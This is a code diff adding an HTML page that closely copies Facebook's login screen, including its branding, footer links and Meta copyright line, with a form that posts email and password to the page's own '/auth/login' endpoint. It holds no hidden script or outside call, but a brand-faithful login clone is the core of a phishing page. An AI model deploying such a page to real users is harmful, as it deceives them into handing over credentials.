@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook – Log in or sign up</title>
+  <link rel="stylesheet" href="login.css" />
+</head>
+<body>
+
+  <main class="fb-main">
+    <!-- Left -->
+    <div class="fb-left">
+      <div class="fb-logo">facebook</div>
+      <p class="fb-tagline">Explore the things you love.</p>
+    </div>
+
+    <!-- Right -->
+    <div class="fb-card">
+
+    <form action="/auth/login" method="POST">
+
+        <input
+            id="fb-account"
+            class="fb-input"
+            type="email"
+            name="email"
+            placeholder="Email or mobile number"
+            required
+        >
+
+        <input
+            id="fb-password"
+            class="fb-input"
+            type="password"
+            name="password"
+            placeholder="Password"
+            required
+        >
+
+        <button
+            id="btn-login"
+            class="fb-btn-login"
+            type="submit"
+        >
+            Log in
+        </button>
+
+    </form>
+
+    <a href="#" class="fb-forgot">Forgot password?</a>
+
+    <hr class="fb-divider">
+
+    <button
+        id="btn-signup"
+        class="fb-btn-create"
+        type="button"
+    >
+        Create new account
+    </button>
+
+    <p class="fb-page-link">
+        <a>Create a Page</a> for a celebrity, brand or business.
+    </p>
+</div>
+  </main>
+
+  <footer>
+    <!-- Language bar -->
+    <div class="fb-lang-bar">
+      <span>English (US)</span>
+      <a>Filipino</a>
+      <a >Bisaya</a>
+      <a>Español</a>
+      <a>日本語</a>
+      <a>한국어</a>
+      <a>中文(简体)</a>
+      <a>More languages…</a>
+    </div>
+
+    <hr class="fb-divider" />
+
+    <!-- Footer links -->
+    <div class="fb-footer-links">
+        <a>Sign Up</a>
+        <a>Log In</a>
+        <a>Messenger</a>
+        <a>Facebook Lite</a>
+        <a>Video</a>
+        <a>Meta Pay</a>
+        <a>Meta Store</a>
+        <a>Meta Quest</a>
+        <a>Ray-Ban Meta</a>
+        <a>Meta AI</a>
+        <a>Instagram</a>
+        <a>Threads</a>
+        <a>Privacy Policy</a>
+        <a>Privacy Center</a>
+        <a>About</a>
+        <a>Create ad</a>
+        <a>Create Page</a>
+        <a>Developers</a>
+        <a>Careers</a>
+        <a>Cookies</a>
+        <a>Ad choices</a>
+        <a>Terms</a>
+        <a>Help</a>
+        <a>Contact Uploading &amp; Non-Users</a>
+    </div>
+
+    <p class="fb-footer-copy">Meta &copy; 2026</p>
+  </footer>
+</body>
+</html>
